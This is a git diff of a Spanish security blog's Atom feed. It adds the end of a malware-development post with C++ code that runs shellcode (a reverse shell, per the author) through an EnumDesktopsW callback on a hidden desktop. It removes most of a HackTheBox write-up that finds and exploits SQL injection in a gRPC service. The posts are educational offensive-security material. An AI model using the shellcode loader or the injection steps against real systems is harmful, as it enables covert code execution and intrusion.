+	        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	
+	        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcodeSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	
+	        &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hAlloc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+	            &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	            &lt;span class=&quot;n&quot;&gt;shellcodeSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	            &lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	            &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;
+	        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	
+	        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcodeSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	        &lt;span class=&quot;n&quot;&gt;EnumDesktopsW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessWindowStation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DESKTOPENUMPROCW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	        &lt;span class=&quot;n&quot;&gt;CloseDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;explicacion-rapida&quot;&gt;Explicacion rapida&lt;/h3&gt;
+
+&lt;p&gt;Se crea un hilo para ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SwitchDesktopThread()&lt;/code&gt;, asi que cuando se ejecute esa funcion cambiara al escritorio mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetThreadDesktop()&lt;/code&gt;, ese escritorio se llama “ShellcodeDesk” creado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateDesktop()&lt;/code&gt;, permitiendo que esa accion ocurra en segundo plano en ese hilo que se creo, despues se reserva memoria con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc()&lt;/code&gt; para la shellcode y se inyectara en el contexto del escritorio “ShellcodeDesk” mediante la funcion de callback &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnumDesktopW()&lt;/code&gt;, permitiento asi que el escritorio actual del usuario no este ocurriendo nada, y todo el proceso de la shellcode se este ejecutando en el escritorio “ShellcodeDesk”&lt;/p&gt;
+
+&lt;h3 id=&quot;explicacion-de-cada-funcion&quot;&gt;Explicacion de cada funcion&lt;/h3&gt;
+
+&lt;h4 id=&quot;createdesktopw&quot;&gt;CreateDesktopW()&lt;/h4&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HDESK&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateDesktopW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;ShellcodeDesk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_ALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Creara un nuevo escritorio llamado “ShellcodeDesk” donde se le da acceso “GENERIC_ALL” para tener control total de ese ecritorio, y ojo,
+para windows los escritorios solo son objetos que representan un area virtual la cual ejecuta aplicaciones y tiene ventanas, cada escritorio
+esta aislado de otro escritorio, es decir, que cada escritorio tiene sus ventanas, aplicaciones.&lt;/p&gt;
+
+&lt;p&gt;Como curiosidad, la creacion de escritorios esta limitada por el tamaño del heap del escritorio del sistema, el cual es de 48 MB&lt;/p&gt;
+
+&lt;p&gt;Y si ese escritorio se crea, osea es diferente de NULL, regresa un identificador que se guarda en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hDesktop&lt;/code&gt;, y pasara a la funcion CreateThread()&lt;/p&gt;
+
+&lt;h4 id=&quot;createthread&quot;&gt;CreateThread()&lt;/h4&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SwitchDesktopThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Ahora, cuando se hace un llamado a esta funcion lo que esta pasando es que crea un hilo en el proceso actual, y date cuenta que este hilo su tercer parametro es un puntero del nombre de la funcion que se va a ejecutar en ese hilo, osea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SwitchDesktopThread&lt;/code&gt;, tambien se le pasa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hDesktop&lt;/code&gt; que es la variable que tiene el escritorio creado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateDesktopW()&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;switchdesktopthread&quot;&gt;SwitchDesktopThread()&lt;/h4&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WINAPI&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SwitchDesktopThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HDESK&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HDESK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;SetThreadDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Ahora con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SwitchDesktopThread&lt;/code&gt; lo que esta haciendo es cambiar al escritorio creado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateDesktopW()&lt;/code&gt; mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetThreadDesktop()&lt;/code&gt;, sin embargo este cambio lo hace asignando el escritorio creado al hilo al que pertenece o del cual se esta ejecutando, osea, el escritorio “ShellcodeDesk” que se creo con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateDesktopW()&lt;/code&gt; se estaria ejecutando en el hilo creado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateThread&lt;/code&gt;, por eso mismo, en uno de los parametros de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateThread&lt;/code&gt; se le pasa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hDesktop&lt;/code&gt;, que es la variable que tiene el nombre de escritorio “ShellcodeDesk”.&lt;/p&gt;
+
+&lt;h4 id=&quot;ejecucion-de-la-shellcode&quot;&gt;Ejecucion de la shellcode&lt;/h4&gt;
+
+&lt;p&gt;Y en caso de que todo vaya bien todas las intrucciones que le siguen se estarian ejecutando en ese escritorio (“ShellcodeDesk”) lo cual permite que esten aisladas del escritorio actual del usuario, y ya al final con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnumDesktopsW()&lt;/code&gt; se ejecuta las shellcode en el contexto del escritorio creado, osea ShellcodeDesk&lt;/p&gt;
+
+&lt;h4 id=&quot;resultados&quot;&gt;Resultados&lt;/h4&gt;
+
+&lt;p&gt;Llega una reverse shell por que eso es lo que hace la shellcode&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/enumDesktopW/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/enumDesktopW/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html">Te explicare como use la funcion de callback EnumDesktopsW() para ejecutar una shellcode en un escritorio creado con CreateDesktopW()
+EnumDesktopsW</summary></entry><entry><title type="html">Un Poco de Pentesting - Session Fixation</title><link href="http://localhost:4000/UPDP-session-fixation/" rel="alternate" type="text/html" title="Un Poco de Pentesting - Session Fixation" /><published>2023-07-05T00:00:00-06:00</published><updated>2023-07-05T00:00:00-06:00</updated><id>http://localhost:4000/UPDP-session-fixation</id><content type="html" xml:base="http://localhost:4000/UPDP-session-fixation/">&lt;p class=&quot;lead&quot;&gt;Te explicare como funciona el ataque Session Fixation con el que podremos robar/secuestrar la sesion de otra persona&lt;/p&gt;
 
 &lt;h2 id=&quot;sesiones&quot;&gt;Sesiones&lt;/h2&gt;
 
@@ -2664,304 +2843,4 @@ _start:
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/UPDWP-ssti/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="SSTI" /><summary type="html">Te explicare como funciona la vulnerabilidad SSTI, sus payloads y como explotarla</summary></entry><entry><title type="html">HackTheBox PC - SQL injection in gRPC service</title><link href="http://localhost:4000/htb-pc/" rel="alternate" type="text/html" title="HackTheBox PC - SQL injection in gRPC service" /><published>2023-05-23T00:00:00-06:00</published><updated>2023-05-23T00:00:00-06:00</updated><id>http://localhost:4000/htb-pc</id><content type="html" xml:base="http://localhost:4000/htb-pc/">&lt;p&gt;Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.&lt;/p&gt;
-
-&lt;h2 class=&quot;lead&quot; id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con un escaneo con:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sS -n -Pn --open -p- 10.129.93.244
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, esto con el fin de iniciar la conexion sin que termine y ademas tarde menos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;n: para que no haga resolucion DNS y tarde menos el escaneo&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Pn: para evitar el descubrimiento de hosts&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;open: para que solo muestre los puertos abiertos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;-p-: para que escanee todo el rango de puertos&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y nos reporto que hay varios puertos abiertos:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE
-22/tcp    open  ssh
-50051/tcp open  unknown
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Les adelanto que si buscamos por versiones y servicios tampoco vamos a encontrar nada, asi que pasamos directamente a buscar en google&lt;/p&gt;
-
-&lt;h3 id=&quot;puerto-50051&quot;&gt;Puerto 50051&lt;/h3&gt;
-
-&lt;p&gt;Al hacer unas busquedas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50051 port&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50051 pentesting&lt;/code&gt; es cuando encuentro que corresponde a gRPC, asi que existe un servidor gRPC en la maquina, antes que nada, vamos a ver que es gRPC&lt;/p&gt;
-
-&lt;h3 id=&quot;grpc&quot;&gt;gRPC&lt;/h3&gt;
-
-&lt;p&gt;gRPC es una implementacion de RPC (Protocolo de llamada a procedimiento remoto) el cuale es usado en aplicaciones cliente-servidor, este funciona de esta forma:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;center&gt;imagen de grpc.io&lt;/center&gt;
-
-&lt;p&gt;Primeramente se debe de tener creado un servidor gRPC con un servicio creado en un lenguaje compatible con gRPC, en esa imagen es C++, despues para interactuar con ese servicio se usa un cliente gRPC stub, donde stub no es mas que nada una funcionalidad encargada de serializar los datos que se envian al servidor, en una arquitectura gRPC se hace uso de algo que se llama Protocol Buffers, que es un mecanismo para serializar datos estructurados, cuando se hace una peticion, esto datos pueden ir en JSON&lt;/p&gt;
-
-&lt;h3 id=&quot;interactuando-con-el-servidor-grpc&quot;&gt;Interactuando con el servidor gRPC&lt;/h3&gt;
-
-&lt;p&gt;Una vez sabiendo que existe un servidor gRPC en la maquina, necesitamos un cliente o al menos algo para realizar peticiones hacia ese servidor, aqui encontre dos: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcui&lt;/code&gt;, usaremos ambas:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;grpcurl: &lt;a href=&quot;https://github.com/fullstorydev/grpcurl&quot;&gt;https://github.com/fullstorydev/grpcur&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;grpcui: &lt;a href=&quot;https://github.com/fullstorydev/grpcui&quot;&gt;https://github.com/fullstorydev/grpcur&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Usare gprcurl guiandome de aca: &lt;a href=&quot;https://notes.akenofu.me/Network%20Pen%20test/gRPC/&quot;&gt;https://notes.akenofu.me/Network%20Pen%20test/gRPC/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Primero listare los servicios expuestos por el servidor gRPC:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 list
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Esto nos arroja:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SimpleApp
-grpc.reflection.v1alpha.ServerReflection
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;El unico que nos interesa es el primero, pero antes… Debo de decir que en un servicio gRPC existen metodos con los cuales podemos realizar peticiones hacia ese servicio para que haga cosas que esten previamente definidas&lt;/p&gt;
-
-&lt;p&gt;Para listar los metodos es asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 list SimpleApp
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SimpleApp.LoginUser
-SimpleApp.RegisterUser
-SimpleApp.getInfo
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Vemos que existen 3 metodos, esos metodos tiene mas definiciones por dentro, que son los mecanismos protobuf asi que usaremos el comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 describe SimpleApp
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SimpleApp is a service:
-service SimpleApp {
-  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
-  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
-  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y vemos que para el metodo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoginUser&lt;/code&gt; existe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.LoginUserRequest&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.LoginUserResponse&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora si queremos ver la definición de un protobuf usamos el comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grpcurl -plaintext 10.129.93.244:50051 describe LoginUserRequest
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y podemos ver la definicion:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LoginUserRequest is a message:
-message LoginUserRequest {
-  string username = 1;
-  string password = 2;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y vemos que tiene definido un nombre y contraseña, así que cuando se use el metodo de LoginUser estara esperando por un nombre y una contraseña.&lt;/p&gt;
-
-&lt;p&gt;Para no hacerlo tan largo, tenemos que nos podemos iniciar sesion, registrar y otro metodo que nos da una pequeña info, aremos los pasos en este orden para luego analizar una peticion&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Registrarse&lt;/li&gt;
-  &lt;li&gt;Iniciar sesion&lt;/li&gt;
-  &lt;li&gt;Mostrar info&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Te dejo los comando de como Registrarse, iniciar sesion y mostrar info usando grpcurl&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Registro: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl -plaintext -d &apos;{&quot;username&quot;:&quot;c4rta&quot;, &quot;password&quot;:&quot;12345&quot;}&apos; 10.129.93.244:50051 SimpleApp.RegisterUser&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Login: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl -plaintext -d &apos;{&quot;username&quot;:&quot;c4rta&quot;, &quot;password&quot;:&quot;12345&quot;}&apos; -v 10.129.93.244:50051 SimpleApp.LoginUser&lt;/code&gt;
-Esto arroja esto:&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Mostrar info:
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcurl -plaintext -d &apos;{&quot;id&quot;:&quot;784&quot;}&apos; -rpc-header &apos;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5NjM2OTV9.9ocP1Hq9USx
-UAv_2BVxRFWLN8vDzlVxrkbiklyoU9ow&apos; 10.129.93.244:50051 SimpleApp.getInfo
-&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Debes de indicarle el ID y tu JWT.&lt;/p&gt;
-
-&lt;p&gt;Ahora si podemos pasar a la explotacion donde te mostrate 2 formas de hacerlo&lt;/p&gt;
-
-&lt;h3 id=&quot;1-sql-injection-gprcui-y-sqlmap--r&quot;&gt;1. SQL injection, gprcui y sqlmap -r&lt;/h3&gt;
-
-&lt;p&gt;grpcui es un cliente gRPC similar a grpcurl, pero este tiene interfaz grafica, primero nos debemos de conectar al servidor gRPC:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grpcui -plaintext &amp;lt;IP&amp;gt;:50051&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto nos abrira una web con las mismas funcionalidades que hicimos con grpcurl.&lt;/p&gt;
-
-&lt;p&gt;Primero creamos un usuario y esto nos debe de salir:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora iniciamos sesion con ese usuario vamos a poder su JWK:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora usaremos esos datos para mostrar la info del usuario que acabamos de crear, pero esta vez interceptaremos la peticion con burp:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos ver que en la parte de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; se le esta pasando nuestro ID y el servidor nos responde esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aqui empece a buscar las diferentes vulnerabilidades que pueden a ver en gRPC y encontre este blog &lt;a href=&quot;https://www.trendmicro.com/en_us/research/20/h/how-unsecure-grpc-implementations-can-compromise-apis.html&quot;&gt;https://www.trendmicro.com/en_us/research/20/h/how-unsecure-grpc-implementations-can-compromise-apis.html&lt;/a&gt;, en una parte habla de SQLi, asi que como la data que esta tramitando es al id, entonces decidi probar injectiones en ese campo&lt;/p&gt;
-
-&lt;p&gt;Primero puse una comilla al final del ID:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;data&quot;:[
-  {
-    &quot;id&quot;:&quot;738&apos;&quot;
-  }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Y eso me dio un error:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/grpc7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Seguramente el gestor de base de datos detecto un error en la consulta y arrojo eso, es posible que haya una SQLi, asi que probare con sqlmap.
-Tomando en cuenta que no tenemos un servidor web como tal, entonces debemos de guardar la peticion que interceptamos con burp y usando el argumento -r de sqlmap, podemos hacerlo, este es el archivo de mi peticion:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /invoke/SimpleApp.getInfo HTTP/1.1
-Host: 127.0.0.1:36401
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/json
-x-grpcui-csrf-token: h000rrAARGYkr4dDDax5sQUcnTmszKcRiLhk-0Aep-k
-X-Requested-With: XMLHttpRequest
-Content-Length: 194
-Origin: http://127.0.0.1:36401
-Connection: close
-Referer: http://127.0.0.1:36401/
-Cookie: csrftoken=dv1RLiX7MBGMrZhvyWH0W4U4HIgJZdFp; _grpcui_csrf_token=h000rrAARGYkr4dDDax5sQUcnTmszKcRiLhk-0Aep-k
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-
